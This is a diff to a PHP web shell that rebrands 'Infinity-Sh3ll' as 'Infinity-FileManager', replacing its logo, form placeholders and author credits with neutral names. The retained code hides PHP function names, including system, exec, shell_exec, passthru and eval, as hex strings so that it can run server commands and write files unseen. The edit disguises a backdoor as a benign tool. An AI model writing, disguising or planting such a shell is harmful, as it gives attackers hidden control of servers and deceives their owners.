@@ -1,7 +1,7 @@
 <?php
 
-$shellName = 'Infinity-Sh3ll';
-$logo = 'https://image.flaticon.com/icons/png/512/2959/2959607.png';
+$shellName = 'Infinity-FileManager';
+$logo = 'https://img.icons8.com/external-kiranshastry-lineal-kiranshastry/512/external-file-cyber-security-kiranshastry-lineal-kiranshastry-6.png';
 $func = ["7068705f756e616d65", "70687076657273696f6e", "676574637764", "6368646972", "707265675f73706c6974", "61727261795f64696666", "69735f646972", "69735f66696c65", "69735f7772697461626c65", "69735f7265616461626c65", "66696c6573697a65", "636f7079", "66696c655f657869737473", "66696c655f7075745f636f6e74656e7473", "66696c655f6765745f636f6e74656e7473", "6d6b646972", "72656e616d65", "737472746f74696d65", "68746d6c7370656369616c6368617273", "64617465", "66696c656d74696d65", "7363616e646972", "73797374656d", "65786563", "7061737374687275", "7368656c6c5f65786563", "6f625f6765745f636f6e74656e7473", "6f625f656e645f636c65616e", "6469726e616d65", "6469736b5f746f74616c5f7370616365", "6469736b5f667265655f7370616365", "696e695f676574", "707265675f6d617463685f616c6c", "706f7369785f6765747077756964", "706f7369785f6765746772676964", "70617468696e666f", "66696c656f776e6572", "66696c6567726f7570", "66696c6574797065", "676574486f73744e616d65", "676574486f737442794e616d65", "737562737472", "737472737472", "696e695f736574", "66696c65", "7374725f7265706c616365", "6578706c6f6465", "6576616c", "6f625f7374617274", "66756e6374696f6e5f657869737473", "6572726f725f7265706f7274696e67", "7365745f74696d655f6c696d6974", "636c656172737461746361636865", "646174655f64656661756c745f74696d657a6f6e655f736574", "666c757368", "7374726c656e", "7472696d", "656d707479", "6973736574", "66696c657065726d73", "7374726c656e", "636f756e74", "726f756e64", "6d696d655f636f6e74656e745f74797065", "6765745f63757272656e745f75736572", "6765746d79756964", "6765746d79676964", "706f7369785f67657465756964", "706f7369785f67657465676964"];
 
 for ($i = 0; $i < count($func); $i++) {
@@ -453,7 +453,7 @@ $scandir = $func[21]($dir);
 									<form action="" method="post">
 										<div class="mb-3">
 											<label class="form-label">File Name</label>
-											<input type="text" class="form-control" name="filename" placeholder="bibib.txt">
+											<input type="text" class="form-control" name="filename" placeholder="Infinity-FileManager.txt">
 										</div>
 										<div class="mb-3">
 											<label class="form-label">File Content</label>
@@ -474,7 +474,7 @@ $scandir = $func[21]($dir);
 									<form action="" method="post">
 										<div class="mb-3">
 											<label class="form-label">Folder Name</label>
-											<input type="text" class="form-control" name="foldername" placeholder="bibib">
+											<input type="text" class="form-control" name="foldername" placeholder="Infinity-FileManager">
 										</div>
 										<button type="submit" class="btn btn-outline-dark">Create</button>
 									</form>
@@ -655,7 +655,7 @@ $scandir = $func[21]($dir);
 			<div class="col-md-12 my-3">
 				<div class="card border-dark">
 					<div class="card-body">
-						Copyright © Infinity Cyber Team <span class="float-end">Coded by <span class="text-muted">Bibib</span></span>
+						Copyright © Infinity-FileManager <span class="float-end">Coded by <span class="text-muted">Infinity-FileManager</span></span>
 					</div>
 				</div>
 			</div>
